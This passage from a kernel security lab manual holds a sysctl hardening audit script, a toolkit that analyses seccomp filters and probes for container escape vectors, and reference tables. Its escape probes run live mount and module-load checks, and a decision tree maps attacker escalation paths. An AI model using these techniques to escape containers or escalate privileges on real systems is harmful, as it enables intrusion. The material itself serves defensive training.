        - matchArgs:
            - index: 0
              operator: Postfix
              values: ["release_agent"]
          matchNamespaces:
            - namespace: Mnt
              operator: NotIn
              values: ["4026531840"]
          matchActions:
            - action: Sigkill

    # Detect credential changes (commit_creds with uid transition)
    - call: commit_creds
      syscall: false
      args:
        - index: 0
          type: cred
      selectors:
        - matchActions:
            - action: Post
              rateLimit: "1m"

    # Kill kernel module loads from non-standard paths
    - call: security_kernel_module_request
      syscall: false
      args:
        - index: 0
          type: string
      selectors:
        - matchArgs:
            - index: 0
              operator: NotPrefix
              values: ["/lib/modules/", "/usr/lib/modules/"]
          matchActions:
            - action: Sigkill
```

---

### Exercise 11: Kernel Subsystem Hardening Deployment

**Objective:** Deploy comprehensive sysctl hardening, verify configuration, and measure performance impact.

```python
#!/usr/bin/env python3
"""kernel_hardening_audit.py — Audit and deploy kernel subsystem hardening"""

import subprocess
import json
import sys
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class SysctlRule:
    key: str
    value: str
    severity: str  # CRITICAL, HIGH, MEDIUM
    subsystem: str
    impact: str
    description: str

HARDENING_RULES = [
    # eBPF
    SysctlRule("kernel.unprivileged_bpf_disabled", "2", "CRITICAL", "ebpf",
               "Monitoring tools need CAP_BPF",
               "Permanently disable unprivileged BPF program loading"),
    SysctlRule("net.core.bpf_jit_harden", "2", "HIGH", "ebpf",
               "5-10% BPF execution overhead",
               "Enable JIT constant blinding for all users"),
    
    # io_uring
    SysctlRule("io_uring_disabled", "2", "CRITICAL", "io_uring",
               "Applications using io_uring will fail",
               "Disable io_uring entirely (persistent CVE source)"),
    
    # Process protection
    SysctlRule("kernel.yama.ptrace_scope", "2", "HIGH", "process",
               "Only CAP_SYS_PTRACE can debug (breaks gdb for users)",
               "Restrict ptrace to admin-only"),
    SysctlRule("kernel.dmesg_restrict", "1", "HIGH", "kaslr",
               "Non-root cannot read kernel ring buffer",
               "Prevent KASLR bypass via dmesg kernel pointers"),
    SysctlRule("kernel.kptr_restrict", "2", "HIGH", "kaslr",
               "Even root sees zeroed pointers in /proc/kallsyms",
               "Hide kernel pointer addresses from all users"),
    SysctlRule("kernel.perf_event_paranoid", "3", "MEDIUM", "process",
               "Performance profiling requires root/CAP_PERFMON",
               "Disable unprivileged perf events"),
    SysctlRule("kernel.kexec_load_disabled", "1", "HIGH", "integrity",
               "kexec fast reboot unavailable (one-way toggle)",
               "Prevent loading alternative kernels via kexec"),
    SysctlRule("kernel.sysrq", "0", "MEDIUM", "integrity",
               "Emergency SysRq debugging disabled",
               "Disable magic SysRq key"),
    
    # Filesystem
    SysctlRule("fs.protected_symlinks", "1", "HIGH", "filesystem",
               "None for well-written applications",
               "Prevent symlink following in sticky directories"),
    SysctlRule("fs.protected_hardlinks", "1", "HIGH", "filesystem",
               "None for standard use cases",
               "Prevent hardlink creation to unowned files"),
    SysctlRule("fs.protected_fifos", "2", "MEDIUM", "filesystem",
               "Rare edge cases with legacy named pipes",
               "Prevent FIFO opening in sticky directories"),
    SysctlRule("fs.suid_dumpable", "0", "HIGH", "filesystem",
               "Cannot debug SUID binary crashes",
               "Prevent core dumps from SUID processes"),
    
    # Network
    SysctlRule("net.ipv4.conf.all.rp_filter", "1", "MEDIUM", "network",
               "Breaks asymmetric routing",
               "Enable strict reverse path filtering"),
    SysctlRule("net.ipv4.conf.all.accept_redirects", "0", "MEDIUM", "network",
               "None", "Reject ICMP redirects"),
    SysctlRule("net.ipv4.conf.all.send_redirects", "0", "MEDIUM", "network",
               "None", "Don't send ICMP redirects"),
    SysctlRule("net.ipv4.tcp_syncookies", "1", "MEDIUM", "network",
               "None", "Enable SYN cookies for SYN flood protection"),
    
    # Namespace restriction
    SysctlRule("user.max_user_namespaces", "0", "CRITICAL", "namespace",
               "Breaks containers, Flatpak, Chrome sandbox",
               "Disable user namespace creation (nf_tables/overlayfs mitigation)"),
    
    # TTY
    SysctlRule("dev.tty.legacy_tiocsti", "0", "HIGH", "tty",
               "Breaks ancient terminal automation",
               "Disable TIOCSTI ioctl (keystroke injection)"),
]


def get_current_value(key: str) -> Optional[str]:
    """Read current sysctl value"""
    try:
        result = subprocess.run(
            ["sysctl", "-n", key],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return None


def audit_hardening() -> dict:
    """Audit current hardening state"""
    results = {
        "passed": [],
        "failed": [],
        "unavailable": [],
        "score": 0,
    }
    
    total_weight = 0
    earned_weight = 0
    
    weight_map = {"CRITICAL": 10, "HIGH": 5, "MEDIUM": 2}
    
    for rule in HARDENING_RULES:
        weight = weight_map.get(rule.severity, 1)
        total_weight += weight
        
        current = get_current_value(rule.key)
        
        if current is None:
            results["unavailable"].append({
                "key": rule.key,
                "expected": rule.value,
                "reason": "sysctl not found (kernel too old or not compiled in)",
            })
        elif current == rule.value:
            results["passed"].append(rule.key)
            earned_weight += weight
        else:
            results["failed"].append({
                "key": rule.key,
                "expected": rule.value,
                "actual": current,
                "severity": rule.severity,
                "subsystem": rule.subsystem,
                "impact": rule.impact,
                "description": rule.description,
            })
    
    results["score"] = int((earned_weight / total_weight) * 100) if total_weight > 0 else 0
    return results


def generate_hardening_config(exclude_subsystems: list = None) -> str:
    """Generate sysctl.conf content"""
    exclude = set(exclude_subsystems or [])
    
    lines = [
        "# Kernel Subsystem Hardening Configuration",
        "# Generated by kernel_hardening_audit.py",
        f"# Excluded subsystems: {', '.join(exclude) if exclude else 'none'}",
        "",
    ]
    
    current_subsystem = ""
    for rule in HARDENING_RULES:
        if rule.subsystem in exclude:
            continue
        
        if rule.subsystem != current_subsystem:
            current_subsystem = rule.subsystem
            lines.append(f"\n## --- {current_subsystem.upper()} ---")
        
        lines.append(f"# [{rule.severity}] {rule.description}")
        lines.append(f"# Impact: {rule.impact}")
        lines.append(f"{rule.key} = {rule.value}")
    
    return "\n".join(lines)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Kernel subsystem hardening audit")
    parser.add_argument("action", choices=["audit", "generate", "apply"],
                        help="Action to perform")
    parser.add_argument("--exclude", nargs="*", default=[],
                        help="Subsystems to exclude (e.g., namespace io_uring)")
    parser.add_argument("--output", default="/etc/sysctl.d/99-kernel-hardening.conf")
    parser.add_argument("--json", action="store_true", help="JSON output for audit")
    args = parser.parse_args()
    
    if args.action == "audit":
        results = audit_hardening()
        
        if args.json:
            print(json.dumps(results, indent=2))
            return
        
        print(f"\n{'='*60}")
        print(f" Kernel Subsystem Hardening Audit")
        print(f"{'='*60}")
        print(f"\n Score: {results['score']}/100")
        print(f" Passed: {len(results['passed'])}")
        print(f" Failed: {len(results['failed'])}")
        print(f" Unavailable: {len(results['unavailable'])}")
        
        if results['failed']:
            print(f"\n{'─'*60}")
            print(" FAILED CHECKS:")
            print(f"{'─'*60}")
            for item in sorted(results['failed'], key=lambda x: x['severity']):
                print(f"\n [{item['severity']}] {item['key']}")
                print(f"   Current: {item['actual']} → Expected: {item['expected']}")
                print(f"   {item['description']}")
                print(f"   Impact if fixed: {item['impact']}")
    
    elif args.action == "generate":
        config = generate_hardening_config(args.exclude)
        print(config)
        print(f"\n# Save to: {args.output}")
        print(f"# Apply with: sysctl --system")
    
    elif args.action == "apply":
        if os.geteuid() != 0:
            print("[-] Must run as root to apply hardening")
            sys.exit(1)
        
        config = generate_hardening_config(args.exclude)
        Path(args.output).write_text(config)
        print(f"[+] Written to {args.output}")
        
        result = subprocess.run(["sysctl", "--system"], capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Hardening applied successfully")
        else:
            print(f"[-] Some settings failed:\n{result.stderr}")
        
        # Verify
        results = audit_hardening()
        print(f"\n[+] Post-apply score: {results['score']}/100")


if __name__ == "__main__":
    main()
```

---

## PART C: FRAMEWORK DEVELOPMENT

### Kernel Subsystem Security Toolkit

```python
#!/usr/bin/env python3
"""
subsystem_toolkit.py — Kernel Subsystem Security Assessment Framework

Provides:
- Seccomp filter analysis and bypass detection
- Container escape vector enumeration
- Kernel subsystem attack surface mapping
- Hardening verification and deployment
- Detection rule generation
"""

import os
import sys
import json
import subprocess
import struct
import socket
import argparse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from pathlib import Path
from enum import Enum

# ============================================================
# Data Models
# ============================================================

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"

@dataclass
class SubsystemFinding:
    subsystem: str
    title: str
    severity: Severity
    description: str
    exploitation: str
    mitigation: str
    detection_key: str
    cves: List[str] = field(default_factory=list)

@dataclass
class ContainerEscapeVector:
    name: str
    preconditions: List[str]
    technique: str
    detection: str
    mitigation: str
    available: bool = False

@dataclass
class SeccompAnalysis:
    has_arch_check: bool
    blocked_syscalls: Set[str]
    allowed_dangerous: Set[str]
    io_uring_blocked: bool
    bypasses: List[str]
    score: int

# ============================================================
# Seccomp Analysis Module
# ============================================================

class SeccompAnalyzer:
    """Analyze seccomp filter security"""
    
    DANGEROUS_ALLOWED = {
        "ptrace", "process_vm_readv", "process_vm_writev",
        "kexec_load", "kexec_file_load",
        "init_module", "finit_module", "delete_module",
        "mount", "umount2", "pivot_root",
        "bpf", "perf_event_open",
        "io_uring_setup", "io_uring_enter", "io_uring_register",
        "unshare", "setns",
    }
    
    def analyze_process(self, pid: int) -> Optional[SeccompAnalysis]:
        """Analyze seccomp filter of a running process"""
        status_path = f"/proc/{pid}/status"
        try:
            with open(status_path) as f:
                for line in f:
                    if line.startswith("Seccomp:"):
                        mode = int(line.split()[1])
                        if mode == 0:
                            return None  # No seccomp
                        break
        except (FileNotFoundError, PermissionError):
            return None
        
        # Use seccomp-tools if available
        try:
            result = subprocess.run(
                ["seccomp-tools", "dump", "-p", str(pid)],
                capture_output=True, text=True, timeout=5
            )
            return self._parse_seccomp_tools_output(result.stdout)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        return SeccompAnalysis(
            has_arch_check=False,
            blocked_syscalls=set(),
            allowed_dangerous=set(),
            io_uring_blocked=False,
            bypasses=["Cannot analyze — install seccomp-tools"],
            score=0
        )
    
    def _parse_seccomp_tools_output(self, output: str) -> SeccompAnalysis:
        """Parse seccomp-tools dump output"""
        has_arch = "arch" in output.lower() and "AUDIT_ARCH" in output
        
        blocked = set()
        if "KILL" in output or "ERRNO" in output:
            for line in output.splitlines():
                if "KILL" in line or "ERRNO" in line:
                    # Extract syscall name/number from context
                    pass
        
        io_uring_blocked = any(
            x in output for x in ["425", "426", "427",
                                   "io_uring_setup", "io_uring_enter"]
        )
        
        bypasses = []
        if not has_arch:
            bypasses.append("ARCH_CONFUSION: No architecture validation — "
                          "32-bit syscall bypass possible via int 0x80")
        if not io_uring_blocked:
            bypasses.append("IO_URING_BYPASS: io_uring syscalls not blocked — "
                          "file ops possible via submission ring")
        
        allowed_dangerous = self.DANGEROUS_ALLOWED - blocked
        
        score = 100
        if not has_arch: score -= 30
        if not io_uring_blocked: score -= 20
        score -= min(50, len(allowed_dangerous) * 5)
        
        return SeccompAnalysis(
            has_arch_check=has_arch,
            blocked_syscalls=blocked,
            allowed_dangerous=allowed_dangerous,
            io_uring_blocked=io_uring_blocked,
            bypasses=bypasses,
            score=max(0, score)
        )
    
    def generate_hardened_filter(self, allowed_syscalls: Set[str],
                                 arch: str = "x86_64") -> str:
        """Generate C code for a hardened seccomp filter"""
        code = '''#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/prctl.h>
#include <stddef.h>

static void install_hardened_filter(void) {
    struct sock_filter filter[] = {
        /* Validate architecture */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        /* Load syscall number */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
'''
        
        # Block io_uring explicitly
        code += '''        /* Block io_uring (persistent CVE source) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 425, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 426, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 427, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
'''
        code += '''        /* Default: allow */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
'''
        return code

# ============================================================
# Container Escape Enumeration
# ============================================================

class ContainerEscapeEnumerator:
    """Enumerate available container escape vectors"""
    
    def enumerate(self) -> List[ContainerEscapeVector]:
        vectors = []
        
        # Check if we're in a container
        if not self._in_container():
            return [ContainerEscapeVector(
                name="NOT_IN_CONTAINER",
                preconditions=[], technique="N/A",
                detection="N/A", mitigation="N/A", available=False
            )]
        
        # 1. Cgroup release_agent
        vectors.append(self._check_cgroup_escape())
        
        # 2. core_pattern write
        vectors.append(self._check_core_pattern())
        
        # 3. Privileged mode (full device access)
        vectors.append(self._check_privileged())
        
        # 4. Docker socket mount
        vectors.append(self._check_docker_socket())
        
        # 5. Kernel module loading
        vectors.append(self._check_module_load())
        
        # 6. User namespace + overlayfs
        vectors.append(self._check_userns_overlay())
        
        return vectors
    
    def _in_container(self) -> bool:
        return (os.path.exists("/.dockerenv") or
                os.path.exists("/run/.containerenv") or
                "container" in open("/proc/1/cgroup", "r").read())
    
    def _check_cgroup_escape(self) -> ContainerEscapeVector:
        available = False
        try:
            os.makedirs("/tmp/cgrp_check", exist_ok=True)
            ret = os.system("mount -t cgroup -o rdma cgroup /tmp/cgrp_check 2>/dev/null")
            if ret == 0:
                available = True
                os.system("umount /tmp/cgrp_check 2>/dev/null")
            os.rmdir("/tmp/cgrp_check")
        except:
            pass
        
        return ContainerEscapeVector(
            name="Cgroup release_agent",
            preconditions=["CAP_SYS_ADMIN", "cgroup v1 available", "no AppArmor"],
            technique="Mount cgroup, set release_agent to host-path cmd, trigger",
            detection="audit key: cgroup_write, Falco: release_agent write",
            mitigation="Drop CAP_SYS_ADMIN, use cgroup v2, enable AppArmor",
            available=available
        )
    
    def _check_core_pattern(self) -> ContainerEscapeVector:
        available = False
        try:
            with open("/proc/sys/kernel/core_pattern", "r") as f:
                pass
            with open("/proc/sys/kernel/core_pattern", "a") as f:
                available = True
        except PermissionError:
            pass
        
        return ContainerEscapeVector(
            name="core_pattern write",
            preconditions=["Writable /proc/sys/kernel/", "Can trigger core dump"],
            technique="Write |/path/to/cmd to core_pattern, crash a process",
            detection="audit key: proc_corepattern, Falco: core_pattern write",
            mitigation="Mount /proc/sys read-only, drop CAP_SYS_ADMIN",
            available=available
        )
    
    def _check_privileged(self) -> ContainerEscapeVector:
        available = os.path.exists("/dev/sda") or os.path.exists("/dev/nvme0n1")
        
        return ContainerEscapeVector(
            name="Privileged container (host device access)",
            preconditions=["--privileged flag", "Full device access"],
            technique="Mount host filesystem via /dev/sda, chroot",
            detection="Container started with privileged=true",
            mitigation="Never use --privileged; use specific capabilities instead",
            available=available
        )
    
    def _check_docker_socket(self) -> ContainerEscapeVector:
        available = os.path.exists("/var/run/docker.sock")
        
        return ContainerEscapeVector(
            name="Docker socket mount",
            preconditions=["/var/run/docker.sock mounted in container"],
            technique="docker run --privileged -v /:/host to escape",
            detection="Socket mount in container spec, API calls from container",
            mitigation="Never mount Docker socket; use Docker-in-Docker if needed",
            available=available
        )
    
    def _check_module_load(self) -> ContainerEscapeVector:
        available = False
        try:
            # Check if we can call init_module
            import ctypes
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            ret = libc.syscall(175, 0, 0, "")  # init_module with NULL
            available = (ctypes.get_errno() != 1)  # EPERM = blocked
        except:
            pass
        
        return ContainerEscapeVector(
            name="Kernel module loading",
            preconditions=["CAP_SYS_MODULE", "init_module/finit_module allowed"],
            technique="Load malicious kernel module for host access",
            detection="audit key: kmod_load, Falco: module load",
            mitigation="Drop CAP_SYS_MODULE, block in seccomp",
            available=available
        )
    
    def _check_userns_overlay(self) -> ContainerEscapeVector:
        available = False
        try:
            ret = os.system("unshare -U true 2>/dev/null")
            available = (ret == 0)
        except:
            pass
        
        return ContainerEscapeVector(
            name="User namespace + overlayfs",
            preconditions=["User namespace creation allowed", "Vulnerable kernel"],
            technique="Create userns, mount overlay, exploit copy-up SUID handling",
            detection="audit key: namespace_unshare, Falco: namespace creation",
            mitigation="user.max_user_namespaces=0, block unshare in seccomp",
            available=available
        )

# ============================================================
# Subsystem Attack Surface Mapper
# ============================================================

class SubsystemMapper:
    """Map kernel subsystem attack surfaces and current exposure"""
    
    def map_exposure(self) -> List[SubsystemFinding]:
        findings = []
        
        # eBPF exposure
        bpf_val = self._read_sysctl("kernel.unprivileged_bpf_disabled")
        if bpf_val and int(bpf_val) < 2:
            findings.append(SubsystemFinding(
                subsystem="eBPF",
                title="Unprivileged BPF not permanently disabled",
                severity=Severity.CRITICAL,
                description=f"kernel.unprivileged_bpf_disabled = {bpf_val}",
                exploitation="Load crafted BPF program exploiting verifier bug → kernel R/W → root",
                mitigation="sysctl -w kernel.unprivileged_bpf_disabled=2",
                detection_key="ebpf_ops",
                cves=["CVE-2021-3490", "CVE-2022-23222", "CVE-2023-2163"]
            ))
        
        # io_uring exposure
        iouring_val = self._read_sysctl("io_uring_disabled")
        if iouring_val is None or int(iouring_val) < 2:
            findings.append(SubsystemFinding(
                subsystem="io_uring",
                title="io_uring not disabled",
                severity=Severity.CRITICAL,
                description=f"io_uring_disabled = {iouring_val or 'not set (enabled)'}",
                exploitation="Exploit io_uring refcount/buffer UAF → kernel R/W, or bypass seccomp",
                mitigation="sysctl -w io_uring_disabled=2",
                detection_key="io_uring_setup",
                cves=["CVE-2024-0582", "CVE-2023-6932"]
            ))
        
        # User namespaces
        userns_val = self._read_sysctl("user.max_user_namespaces")
        if userns_val and int(userns_val) > 0:
            findings.append(SubsystemFinding(
                subsystem="Namespaces",
                title="User namespace creation enabled",
                severity=Severity.HIGH,
                description=f"user.max_user_namespaces = {userns_val}",
                exploitation="Create userns → gain CAP_NET_ADMIN → exploit nf_tables",
                mitigation="user.max_user_namespaces=0 (breaks containers/Flatpak)",
                detection_key="namespace_unshare",
                cves=["CVE-2023-32233", "CVE-2024-1086"]
            ))
        
        # Ptrace
        ptrace_val = self._read_sysctl("kernel.yama.ptrace_scope")
        if ptrace_val and int(ptrace_val) < 2:
            findings.append(SubsystemFinding(
                subsystem="Process",
                title="ptrace not restricted to admin",
                severity=Severity.MEDIUM,
                description=f"kernel.yama.ptrace_scope = {ptrace_val}",
                exploitation="Ptrace arbitrary processes for code injection/credential theft",
                mitigation="sysctl -w kernel.yama.ptrace_scope=2",
                detection_key="ptrace_ops",
                cves=[]
            ))
        
        # KASLR leak paths
        kptr_val = self._read_sysctl("kernel.kptr_restrict")
        if kptr_val and int(kptr_val) < 2:
            findings.append(SubsystemFinding(
                subsystem="KASLR",
                title="Kernel pointers partially exposed",
                severity=Severity.HIGH,
                description=f"kernel.kptr_restrict = {kptr_val}",
                exploitation="Read /proc/kallsyms to bypass KASLR for kernel exploits",
                mitigation="sysctl -w kernel.kptr_restrict=2",
                detection_key="proc_kallsyms",
                cves=[]
            ))
        
        return findings
    
    def _read_sysctl(self, key: str) -> Optional[str]:
        try:
            result = subprocess.run(
                ["sysctl", "-n", key],
                capture_output=True, text=True, timeout=5
            )
            return result.stdout.strip() if result.returncode == 0 else None
        except:
            return None

# ============================================================
# Main CLI
# ============================================================

def cmd_analyze_seccomp(args):
    """Analyze seccomp filter of a process"""
    analyzer = SeccompAnalyzer()
    result = analyzer.analyze_process(args.pid)
    
    if result is None:
        print(f"[*] PID {args.pid}: No seccomp filter active")
        return
    
    print(f"\n{'='*50}")
    print(f" Seccomp Analysis: PID {args.pid}")
    print(f"{'='*50}")
    print(f" Architecture check: {'YES' if result.has_arch_check else 'NO (VULNERABLE)'}")
    print(f" io_uring blocked: {'YES' if result.io_uring_blocked else 'NO (BYPASS POSSIBLE)'}")
    print(f" Security score: {result.score}/100")
    
    if result.bypasses:
        print(f"\n Bypasses:")
        for b in result.bypasses:
            print(f"   - {b}")
    
    if result.allowed_dangerous:
        print(f"\n Dangerous syscalls NOT blocked:")
        for s in sorted(result.allowed_dangerous):
            print(f"   - {s}")


def cmd_enumerate_escapes(args):
    """Enumerate container escape vectors"""
    enumerator = ContainerEscapeEnumerator()
    vectors = enumerator.enumerate()
    
    print(f"\n{'='*50}")
    print(f" Container Escape Vector Enumeration")
    print(f"{'='*50}")
    
    available = [v for v in vectors if v.available]
    blocked = [v for v in vectors if not v.available]
    
    if available:
        print(f"\n [!] AVAILABLE ESCAPE VECTORS ({len(available)}):")
        for v in available:
            print(f"\n   {v.name}")
            print(f"   Preconditions: {', '.join(v.preconditions)}")
            print(f"   Technique: {v.technique}")
            print(f"   Detection: {v.detection}")
            print(f"   Mitigation: {v.mitigation}")
    
    if blocked:
        print(f"\n [+] BLOCKED VECTORS ({len(blocked)}):")
        for v in blocked:
            print(f"   - {v.name}")


def cmd_map_surface(args):
    """Map kernel subsystem attack surface"""
    mapper = SubsystemMapper()
    findings = mapper.map_exposure()
    
    print(f"\n{'='*50}")
    print(f" Kernel Subsystem Attack Surface")
    print(f"{'='*50}")
    
    if not findings:
        print("\n [+] No critical exposures detected")
        return
    
    for finding in sorted(findings, key=lambda f: f.severity.value):
        print(f"\n [{finding.severity.value}] {finding.subsystem}: {finding.title}")
        print(f"   {finding.description}")
        print(f"   Exploitation: {finding.exploitation}")
        print(f"   Mitigation: {finding.mitigation}")
        if finding.cves:
            print(f"   CVEs: {', '.join(finding.cves)}")


def cmd_harden(args):
    """Run hardening audit"""
    os.execvp(sys.executable, [sys.executable, "kernel_hardening_audit.py", "audit"])


def main():
    parser = argparse.ArgumentParser(
        description="Kernel Subsystem Security Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s seccomp --pid 1234       Analyze seccomp filter of PID 1234
  %(prog)s escape                    Enumerate container escape vectors
  %(prog)s surface                   Map kernel subsystem attack surface
  %(prog)s harden                    Run hardening audit
        """
    )
    
    sub = parser.add_subparsers(dest="command")
    
    p_seccomp = sub.add_parser("seccomp", help="Analyze seccomp filters")
    p_seccomp.add_argument("--pid", type=int, required=True)
    p_seccomp.set_defaults(func=cmd_analyze_seccomp)
    
    p_escape = sub.add_parser("escape", help="Enumerate container escape vectors")
    p_escape.set_defaults(func=cmd_enumerate_escapes)
    
    p_surface = sub.add_parser("surface", help="Map attack surface")
    p_surface.set_defaults(func=cmd_map_surface)
    
    p_harden = sub.add_parser("harden", help="Hardening audit")
    p_harden.set_defaults(func=cmd_harden)
    
    args = parser.parse_args()
    if hasattr(args, "func"):
        args.func(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

---

## Lab Validation Checklist

| # | Exercise | Validation Criteria | Status |
|---|----------|-------------------|--------|
| 1 | Seccomp arch bypass | vuln_sandbox killed by arch_bypass via int 0x80; secure_sandbox kills bypass | ☐ |
| 2 | io_uring seccomp bypass | File opened via io_uring despite openat being blocked in seccomp | ☐ |
| 3 | Cgroup release_agent | /tmp/escape_proof created on host from container context | ☐ |
| 4 | TTY heap spray | Successfully spray kmalloc-1024 with tty_struct, demonstrate reclaim pattern | ☐ |
| 5 | eBPF exploitation | Demonstrate BPF map/program loading, explain verifier type confusion path | ☐ |
| 6 | nf_tables via userns | Gain CAP_NET_ADMIN in user namespace, create nf_tables table | ☐ |
| 7 | Seccomp TOCTOU | Race condition changes path between supervisor check and kernel use | ☐ |
| 8 | Constrained exfiltration | Exfiltrate data via sendfile/splice/memfd/exit-code under seccomp | ☐ |
| 9 | Seccomp profiling | Generate OCI profile from traced workload, deploy in Docker | ☐ |
| 10 | Detection deployment | auditd rules loaded, Falco detecting escape attempts, Tetragon enforcing | ☐ |
| 11 | Hardening audit | Score 80+/100 on hardening audit, all CRITICAL sysctls at expected values | ☐ |

## Appendix A: CVE Reference Table

| CVE | Subsystem | Type | Precondition | Severity |
|-----|-----------|------|--------------|----------|
| CVE-2021-3490 | eBPF | Type confusion | Unprivileged BPF | Critical |
| CVE-2022-23222 | eBPF | Bounds tracking | Unprivileged BPF | Critical |
| CVE-2023-2163 | eBPF | Range bypass | Unprivileged BPF | Critical |
| CVE-2022-32250 | nf_tables | UAF | CAP_NET_ADMIN (userns) | High |
| CVE-2023-32233 | nf_tables | UAF (anon set) | CAP_NET_ADMIN (userns) | Critical |
| CVE-2024-1086 | nf_tables | Double-free | CAP_NET_ADMIN (userns) | Critical |
| CVE-2024-0582 | io_uring | Page UAF | io_uring access | Critical |
| CVE-2023-6932 | io_uring | Refcount | io_uring access | High |
| CVE-2021-3493 | overlayfs | Capability bypass | User namespace | High |
| CVE-2023-0386 | overlayfs | SUID copy-up | User namespace | High |
| CVE-2022-0185 | fs_context | Heap overflow | User namespace | Critical |
| CVE-2022-0847 | pipe (Dirty Pipe) | Page cache write | Unprivileged | Critical |

## Appendix B: MITRE ATT&CK Mapping

| Technique ID | Technique | Lab Exercise |
|-------------|-----------|--------------|
| T1611 | Escape to Host | Ex 3 (cgroup), Ex 6 (namespace) |
| T1068 | Exploitation for Privilege Escalation | Ex 4, 5, 6 |
| T1211 | Exploitation for Defense Evasion | Ex 1, 2 (seccomp bypass) |
| T1059 | Command and Scripting Interpreter | Ex 7 (TOCTOU) |
| T1048 | Exfiltration Over Alternative Protocol | Ex 8 |
| T1547.006 | Boot or Logon Autostart: Kernel Modules | Ex 5 (module loading) |
| T1014 | Rootkit | Detection in Ex 10, 11 |

## Appendix C: Subsystem Exploitation Decision Tree

```
START: Initial access achieved
│
├─ In container?
│  ├─ YES → Check capabilities
│  │  ├─ CAP_SYS_ADMIN → Cgroup release_agent (Ex 3)
│  │  ├─ CAP_NET_ADMIN → nf_tables exploit (Ex 6)
│  │  ├─ CAP_SYS_MODULE → Load kernel module
│  │  ├─ Privileged → Mount host device
│  │  └─ Unprivileged → User namespace escalation path
│  │     ├─ userns allowed? → Create userns → gain caps → nf_tables/overlay
│  │     └─ userns blocked? → Kernel vuln from allowed syscalls
│  │
│  └─ NO → Direct kernel exploitation
│     ├─ eBPF accessible? → Verifier exploit (Ex 5)
│     ├─ io_uring accessible? → io_uring UAF (Ex 2)
│     ├─ Driver access? → ioctl fuzzing → heap spray (Ex 4)
│     └─ Limited syscalls? → Constrained exploitation (Ex 8)
│
├─ Seccomp active?
│  ├─ No arch check → Architecture confusion bypass (Ex 1)
│  ├─ io_uring allowed → io_uring bypass (Ex 2)
│  ├─ Notification mode → TOCTOU (Ex 7)
│  └─ Kernel vuln in allowed path → Full kernel control
│
└─ Post-exploitation
   ├─ commit_creds(prepare_kernel_cred(0))
   ├─ modprobe_path overwrite
   └─ Direct cred structure overwrite
```

## Appendix D: Performance Impact Summary

| Hardening Measure | Impact | Workloads Affected |
|-------------------|--------|-------------------|
| unprivileged_bpf_disabled=2 | None for standard apps | Monitoring tools need CAP_BPF |
| io_uring_disabled=2 | High for io_uring apps | High-perf databases, storage engines |
| bpf_jit_harden=2 | 5-10% BPF overhead | eBPF-based networking (Cilium) |
| yama.ptrace_scope=2 | Breaks user debugging | Developers using gdb/strace |
| user.max_user_namespaces=0 | Breaks containers | Container runtimes, Flatpak, Chrome |
| kptr_restrict=2 | None | Debugging tools reading kallsyms |
| Seccomp (per-workload) | Negligible (<1%) | None if profile is correct |
| AppArmor/SELinux | 1-3% syscall overhead | All processes (minimal) |
| Tetragon enforcement | 2-5% for hooked paths | Processes matching policy selectors |
